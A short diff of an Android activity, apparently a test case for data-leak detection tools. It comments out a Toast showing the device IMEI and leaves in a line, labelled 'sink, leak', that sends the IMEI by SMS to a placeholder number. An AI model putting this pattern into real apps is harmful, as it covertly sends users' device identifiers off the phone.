@@ -29,7 +29,7 @@ public class Activity2 extends Activity {
     }
 
     private void sendMessage(){
-        Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
+        //Toast.makeText(this, imei, Toast.LENGTH_LONG).show();
         SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
     }
